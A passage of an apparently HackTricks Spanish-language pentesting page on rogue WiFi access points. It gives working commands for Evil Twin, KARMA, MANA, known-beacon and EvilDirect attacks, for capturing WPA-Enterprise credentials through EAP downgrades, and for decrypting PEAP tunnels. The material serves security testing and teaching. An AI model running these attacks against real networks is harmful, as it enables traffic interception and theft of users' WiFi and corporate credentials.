### Sondeo activo

* El sondeo activo implica que las estaciones env√≠an solicitudes de sondeo para descubrir APs cercanos y sus caracter√≠sticas.
* Las solicitudes de sondeo dirigidas apuntan a un ESSID espec√≠fico, ayudando a detectar si una red particular est√° dentro del alcance, incluso si es una red oculta.
* Las solicitudes de sondeo de difusi√≥n tienen un campo SSID nulo y se env√≠an a todos los APs cercanos, permitiendo que la estaci√≥n verifique cualquier red preferida sin revelar el contenido de su PNL.

## AP simple con redirecci√≥n a Internet

Antes de explicar c√≥mo realizar ataques m√°s complejos, se explicar√° **c√≥mo** simplemente **crear** un **AP** y **redirigir** su **tr√°fico** a una interfaz conectada **a** Internet.

Usando `ifconfig -a`, verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet est√©n presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea el archivo de configuraci√≥n `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Luego **configura IPs** y **rutas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Y luego **inicia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un archivo de configuraci√≥n `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Detener procesos molestos**, configurar **modo monitor** y **iniciar hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Reenv√≠o y Redirecci√≥n
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un ataque de gemelo malvado explota la forma en que los clientes de WiFi reconocen las redes, confiando principalmente en el nombre de la red (ESSID) sin requerir que la estaci√≥n base (punto de acceso) se autentique ante el cliente. Los puntos clave incluyen:

* **Dificultad en la Diferenciaci√≥n**: Los dispositivos tienen dificultades para distinguir entre puntos de acceso leg√≠timos y maliciosos cuando comparten el mismo ESSID y tipo de encriptaci√≥n. Las redes del mundo real a menudo utilizan m√∫ltiples puntos de acceso con el mismo ESSID para extender la cobertura sin problemas.
* **Manipulaci√≥n de Conexi√≥n y Roaming del Cliente**: El protocolo 802.11 permite a los dispositivos moverse entre puntos de acceso dentro del mismo ESS. Los atacantes pueden explotar esto al atraer a un dispositivo a desconectarse de su estaci√≥n base actual y conectarse a una maliciosa. Esto se puede lograr ofreciendo una se√±al m√°s fuerte o interrumpiendo la conexi√≥n al punto de acceso leg√≠timo a trav√©s de m√©todos como paquetes de desautenticaci√≥n o interferencia.
* **Desaf√≠os en la Ejecuci√≥n**: Ejecutar con √©xito un ataque de gemelo malvado en entornos con m√∫ltiples puntos de acceso bien ubicados puede ser un desaf√≠o. Desautenticar un solo punto de acceso leg√≠timo a menudo resulta en que el dispositivo se conecte a otro punto de acceso leg√≠timo, a menos que el atacante pueda desautenticar todos los puntos de acceso cercanos o colocar estrat√©gicamente el punto de acceso malicioso.

Puedes crear un Open Evil Twin muy b√°sico (sin capacidades para enrutar tr√°fico a Internet) haciendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Tambi√©n podr√≠as crear un Evil Twin usando **eaphammer** (ten en cuenta que para crear evil twins con eaphammer la interfaz **NO DEBE** estar en modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
O usando Airgeddon: `Options: 5,6,7,8,9 (dentro del men√∫ de ataque Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

Por favor, ten en cuenta que por defecto, si un ESSID en el PNL est√° guardado como protegido por WPA, el dispositivo no se conectar√° autom√°ticamente a un Evil Twin abierto. Puedes intentar hacer un DoS al AP real y esperar que el usuario se conecte manualmente a tu Evil Twin abierto, o podr√≠as hacer un DoS al AP real y usar un WPA Evil Twin para capturar el handshake (usando este m√©todo no podr√°s permitir que la v√≠ctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar crackearlo).

_Algunos sistemas operativos y antivirus advertir√°n al usuario que conectarse a una red abierta es peligroso..._

### WPA/WPA2 Evil Twin

Puedes crear un **Evil Twin usando WPA/2** y si los dispositivos est√°n configurados para conectarse a ese SSID con WPA/2, intentar√°n conectarse. De todos modos, **para completar el 4-way-handshake** tambi√©n necesitas **conocer** la **contrase√±a** que el cliente va a usar. Si **no la conoces**, la **conexi√≥n no se completar√°**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender estos ataques, recomendar√≠a leer antes la breve [explicaci√≥n de WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` necesita un **archivo de configuraci√≥n** para funcionar. Para **automatizar** la generaci√≥n de estas configuraciones, podr√≠as usar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (descarga el archivo de python dentro de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuraci√≥n, puedes seleccionar muchas cosas diferentes como ssid, canal, archivos de usuario, cret/key, par√°metros dh, versi√≥n wpa y auth...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesi√≥n.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer propone estos m√©todos de autenticaci√≥n (nota GTC como el primero en intentar obtener contrase√±as en texto plano y luego el uso de m√©todos de autenticaci√≥n m√°s robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodolog√≠a predeterminada para evitar tiempos de conexi√≥n largos. Sin embargo, tambi√©n puedes especificar al servidor los m√©todos de autenticaci√≥n de m√°s d√©bil a m√°s fuerte:
```
--negotiate weakest
```
O tambi√©n podr√≠as usar:

* `--negotiate gtc-downgrade` para usar una implementaci√≥n de GTC downgrade altamente eficiente (contrase√±as en texto plano)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente los m√©todos ofrecidos (ofrecer los mismos m√©todos de autenticaci√≥n en el mismo orden que la organizaci√≥n har√° que el ataque sea mucho m√°s dif√≠cil de detectar).
* [Encuentra m√°s informaci√≥n en la wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` puede usar certificados generados previamente para ofrecer autenticaci√≥n EAP a redes WPA/WPA2-Enterprise. La red falsa degradar√° el protocolo de conexi√≥n a EAP-MD5 para poder **capturar al usuario y el MD5 de la contrase√±a**. Luego, el atacante puede intentar descifrar la contrase√±a.\
`Airgeddon` te ofrece la posibilidad de un **ataque continuo de Evil Twin (ruidoso)** o **solo crear el ataque Evil hasta que alguien se conecte (suave).**

![](<../../.gitbook/assets/image (936).png>)

### Depurando t√∫neles TLS PEAP y EAP-TTLS en ataques de Evil Twins

_Este m√©todo fue probado en una conexi√≥n PEAP, pero como estoy descifrando un t√∫nel TLS arbitrario, esto tambi√©n deber√≠a funcionar con EAP-TTLS_

Dentro de la **configuraci√≥n** de _hostapd-wpe_ **comenta** la l√≠nea que contiene _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` a `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto har√° que `hostapd-wpe` **intercambie claves usando RSA** en lugar de DH, por lo que podr√°s **descifrar** el tr√°fico m√°s tarde **conociendo la clave privada del servidor**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuraci√≥n modificada como de costumbre. Adem√°s, inicia **`wireshark`** en la **interfaz** que est√° realizando el ataque de Evil Twin.

Ahora o m√°s tarde (cuando ya hayas capturado algunas intenciones de autenticaci√≥n) puedes agregar la clave RSA privada a wireshark en: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Agrega una nueva entrada y completa el formulario con estos valores: **Direcci√≥n IP = cualquier** -- **Puerto = 0** -- **Protocolo = data** -- **Archivo de clave** (**selecciona tu archivo de clave**, para evitar problemas selecciona un archivo de clave **sin estar protegido por contrase√±a**).

![](<../../.gitbook/assets/image (687).png>)

Y mira la nueva **pesta√±a "TLS descifrado"**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA y ataque de balizas conocidas

### Listas negras/blancas de ESSID y MAC

Diferentes tipos de Listas de Filtros de Control de Acceso a Medios (MFACLs) y sus correspondientes modos y efectos en el comportamiento de un Punto de Acceso (AP) malicioso:

1. **Lista blanca basada en MAC**:
* El AP malicioso solo responder√° a solicitudes de sondeo de dispositivos especificados en la lista blanca, permaneciendo invisible para todos los dem√°s no listados.
2. **Lista negra basada en MAC**:
* El AP malicioso ignorar√° las solicitudes de sondeo de dispositivos en la lista negra, haciendo que el AP malicioso sea invisible para esos dispositivos espec√≠ficos.
3. **Lista blanca basada en SSID**:
* El AP malicioso responder√° a solicitudes de sondeo solo para ESSIDs espec√≠ficos listados, haci√©ndolo invisible para dispositivos cuya Lista de Redes Preferidas (PNLs) no contenga esos ESSIDs.
4. **Lista negra basada en SSID**:
* El AP malicioso no responder√° a solicitudes de sondeo para los ESSIDs espec√≠ficos en la lista negra, haci√©ndolo invisible para dispositivos que buscan esas redes particulares.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este m√©todo permite a un **atacante crear un punto de acceso (AP) malicioso que responde a todas las solicitudes de sondeo** de dispositivos que buscan conectarse a redes. Esta t√©cnica **enga√±a a los dispositivos para que se conecten al AP del atacante** al imitar las redes que los dispositivos est√°n buscando. Una vez que un dispositivo env√≠a una solicitud de conexi√≥n a este AP malicioso, completa la conexi√≥n, llevando al dispositivo a conectarse err√≥neamente a la red del atacante.

### MANA

Luego, **los dispositivos comenzaron a ignorar las respuestas de red no solicitadas**, reduciendo la efectividad del ataque karma original. Sin embargo, se introdujo un nuevo m√©todo, conocido como el **ataque MANA**, por Ian de Villiers y Dominic White. Este m√©todo implica que el AP malicioso **captura las Listas de Redes Preferidas (PNL) de los dispositivos al responder a sus solicitudes de sondeo de difusi√≥n** con nombres de red (SSIDs) previamente solicitados por los dispositivos. Este ataque sofisticado elude las protecciones contra el ataque karma original al explotar la forma en que los dispositivos recuerdan y priorizan las redes conocidas.

El ataque MANA opera monitoreando tanto las solicitudes de sondeo dirigidas como las de difusi√≥n de los dispositivos. Para las solicitudes dirigidas, registra la direcci√≥n MAC del dispositivo y el nombre de la red solicitada, a√±adiendo esta informaci√≥n a una lista. Cuando se recibe una solicitud de difusi√≥n, el AP responde con informaci√≥n que coincide con cualquiera de las redes en la lista del dispositivo, incitando al dispositivo a conectarse al AP malicioso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Un **ataque Loud MANA** es una estrategia avanzada para cuando los dispositivos no utilizan sondeos dirigidos o cuando sus Listas de Redes Preferidas (PNL) son desconocidas para el atacante. Funciona sobre el principio de que **los dispositivos en la misma √°rea probablemente compartan algunos nombres de red en sus PNL**. En lugar de responder de manera selectiva, este ataque transmite respuestas de sondeo para cada nombre de red (ESSID) encontrado en las PNL combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la posibilidad de que un dispositivo reconozca una red familiar e intente conectarse al Punto de Acceso (AP) malicioso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Cuando el **Loud MANA attack** puede no ser suficiente, el **Known Beacon attack** presenta otro enfoque. Este m√©todo **fuerza el proceso de conexi√≥n simulando un AP que responde a cualquier nombre de red, recorriendo una lista de ESSIDs potenciales** derivados de una lista de palabras. Esto simula la presencia de numerosas redes, con la esperanza de coincidir un ESSID dentro de la PNL de la v√≠ctima, lo que provoca un intento de conexi√≥n al AP fabricado. El ataque puede ser amplificado combin√°ndolo con la opci√≥n `--loud` para un intento m√°s agresivo de atrapar dispositivos.

Eaphammer implement√≥ este ataque como un MANA attack donde todos los ESSIDs dentro de una lista son cargados (tambi√©n podr√≠as combinar esto con `--loud` para crear un ataque Loud MANA + Known beacons):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de Beacon Burst Conocido**

El **ataque de Beacon Burst Conocido** implica **la transmisi√≥n r√°pida de tramas de beacon para cada ESSID listado en un archivo**. Esto crea un entorno denso de redes falsas, aumentando considerablemente la probabilidad de que los dispositivos se conecten al AP malicioso, especialmente cuando se combina con un ataque MANA. Esta t√©cnica aprovecha la velocidad y el volumen para abrumar los mecanismos de selecci√≥n de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite a los dispositivos conectarse directamente entre s√≠ utilizando Wi-Fi sin la necesidad de un punto de acceso inal√°mbrico tradicional. Esta capacidad est√° integrada en varios dispositivos de Internet de las Cosas (IoT), como impresoras y televisores, facilitando la comunicaci√≥n directa entre dispositivos. Una caracter√≠stica notable de Wi-Fi Direct es que un dispositivo asume el papel de un punto de acceso, conocido como el propietario del grupo, para gestionar la conexi√≥n.

La seguridad para las conexiones Wi-Fi Direct se establece a trav√©s de **Wi-Fi Protected Setup (WPS)**, que admite varios m√©todos para emparejamiento seguro, incluyendo:

* **Push-Button Configuration (PBC)**
* **PIN entry**
* **Near-Field Communication (NFC)**

Estos m√©todos, particularmente la entrada de PIN, son susceptibles a las mismas vulnerabilidades que WPS en redes Wi-Fi tradicionales, convirti√©ndolos en objetivos para vectores de ataque similares.

### EvilDirect Hijacking

**EvilDirect Hijacking** es un ataque espec√≠fico de Wi-Fi Direct. Refleja el concepto de un ataque Evil Twin pero se dirige a las conexiones Wi-Fi Direct. En este escenario, un atacante se hace pasar por un propietario de grupo leg√≠timo con el objetivo de enga√±ar a los dispositivos para que se conecten a una entidad maliciosa. Este m√©todo se puede ejecutar utilizando herramientas como `airbase-ng` especificando el canal, ESSID y direcci√≥n MAC del dispositivo suplantado:

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Echa un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
